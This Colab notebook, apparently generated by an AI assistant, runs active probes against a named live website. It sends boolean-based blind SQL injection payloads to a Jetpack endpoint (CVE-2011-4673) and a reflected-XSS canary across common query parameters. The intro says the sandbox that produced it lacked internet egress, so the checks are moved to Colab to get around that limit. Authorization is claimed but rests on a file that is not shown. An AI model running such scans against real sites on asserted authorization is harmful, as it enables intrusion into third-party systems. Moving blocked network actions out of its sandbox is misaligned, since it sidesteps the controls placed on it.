# milatova.org.il — Jetpack SQLi + Reflected XSS scan

Runs the two authorized, narrowly-scoped active checks from
`pentest-milatova/` (see `scope.md` in the repo for the exact
authorization and hard limits each test operates under):

1. **CVE-2011-4673** — Jetpack `sharedaddy.php` `id`-parameter SQL
   injection. Version-fingerprints Jetpack first; only sends
   boolean-based blind probes (no data extraction) if the install is
   unknown/in the vulnerable range.
2. **Reflected XSS** — GET-only, inert canary marker across common
   query parameters. No stored/POST-based payloads.

This notebook is self-contained (stdlib only, no `pip install`
needed) so it runs in a fresh Colab runtime as-is. Colab has normal
internet egress, unlike the sandboxed session that generated this
notebook, which is why the checks are being run here instead.

**Only run this against a target you are authorized to test.**

In [ ]:
TARGET = "https://milatova.org.il"  #@param {type:"string"}
DELAY = 1.5  #@param {type:"number"}
TIMEOUT = 10.0  #@param {type:"number"}

import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

USER_AGENT = "pentest-milatova-colab-check/1.0 (+authorized-assessment)"

def fetch(url, timeout=TIMEOUT):
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except urllib.error.URLError as e:
        return None, str(e).encode()

print(f"Target: {TARGET}")

## 1. Jetpack SQLi (CVE-2011-4673)

In [ ]:
README_PATH = "/wp-content/plugins/jetpack/readme.txt"
SHAREDADDY_PATH = "/wp-content/plugins/jetpack/modules/sharedaddy.php"
TRUE_PAYLOAD = "1 AND 1=1"
FALSE_PAYLOAD = "1 AND 1=2"

def version_is_vulnerable(version):
    # CVE-2011-4673 affects Jetpack <= 1.0; anything major >= 2 (i.e.
    # essentially every real-world install since ~2012) is not.
    if not version:
        return True  # unknown -- can't rule out, test anyway
    try:
        return int(version.split(".")[0]) < 2
    except ValueError:
        return True

base = TARGET.rstrip("/")
print("== CVE-2011-4673: Jetpack sharedaddy.php `id` SQLi check ==")

status, body = fetch(base + README_PATH)
version = None
if status == 200:
    m = re.search(r"Stable tag:\s*([\d.]+)", body.decode("utf-8", errors="replace"), re.IGNORECASE)
    version = m.group(1) if m else None
print(f"[{status}] GET {base}{README_PATH} -> Jetpack version: {version or 'unknown'}")
time.sleep(DELAY)

if not version_is_vulnerable(version):
    print(f"\nJetpack {version} is well outside the vulnerable range "
          f"(CVE-2011-4673 affects <= 1.0, fixed in 1.1 back in 2011). "
          f"Not sending injection probes -- nothing to test for.")
else:
    print(f"\nVersion {'unknown' if not version else version} is in/near the "
          f"historically vulnerable range; sending boolean-based blind probes...")
    results = {}
    for label, payload in (("TRUE", TRUE_PAYLOAD), ("FALSE", FALSE_PAYLOAD)):
        url = f"{base}{SHAREDADDY_PATH}?share=email&nb=1&id={urllib.parse.quote(payload)}"
        status, body = fetch(url)
        results[label] = (status, len(body))
        print(f"[{status}] GET {url} -> {len(body)} bytes")
        time.sleep(DELAY)

    true_status, true_len = results["TRUE"]
    false_status, false_len = results["FALSE"]
    print("\n== Result ==")
    if true_status is None or false_status is None:
        print("One or both requests failed at the network level -- no conclusion.")
    elif true_status == 404 and false_status == 404:
        print("404 on both -- sharedaddy.php not directly reachable (expected on modern Jetpack). Not applicable.")
    elif (true_status, true_len) != (false_status, false_len):
        print("DIFFERING responses between TRUE/FALSE -- possible SQLi oracle. "
              "Needs manual verification. Do NOT proceed to data extraction "
              "without separately authorizing that phase.")
    else:
        print("Identical responses -- no evidence of the boolean SQLi oracle. Not vulnerable.")

## 2. Reflected XSS scan

In [ ]:
PAGES = ["/", "/?s=", "/wp-login.php?redirect_to="]
PARAMS = ["s", "q", "search", "id", "page", "author", "redirect_to", "url"]

def make_canary():
    token = uuid.uuid4().hex[:8]
    return token, f'"\'<xsscanary-{token}>'

print("== Reflected XSS scan (GET-only, inert canary) ==\n")
hits = []
for page in PAGES:
    for param in PARAMS:
        token, marker = make_canary()
        if page.endswith("="):
            url = base + page + urllib.parse.quote(marker, safe="")
        elif "?" in page:
            url = base + page + "&" + param + "=" + urllib.parse.quote(marker, safe="")
        else:
            url = base + page + "?" + param + "=" + urllib.parse.quote(marker, safe="")

        status, body = fetch(url)
        text = body.decode("utf-8", errors="replace") if body else ""
        reflected_raw = marker in text
        reflected_escaped_only = (not reflected_raw) and (token in text)

        if reflected_raw:
            print(f"[{status}] GET {url}\n    ** UNESCAPED REFLECTION -- possible reflected XSS **")
            hits.append(url)
        elif reflected_escaped_only:
            print(f"[{status}] GET {url}\n    canary present but HTML-escaped (safe)")
        else:
            print(f"[{status}] GET {url}\n    not reflected")
        time.sleep(DELAY)

print("\n== Summary ==")
if hits:
    print(f"{len(hits)} URL(s) showed unescaped reflection -- confirm manually before reporting:")
    for h in hits:
        print(f"  - {h}")
else:
    print("No unescaped canary reflection found across tested pages/parameters. "
          "Does not rule out untested parameters, POST-based flows, or stored XSS.")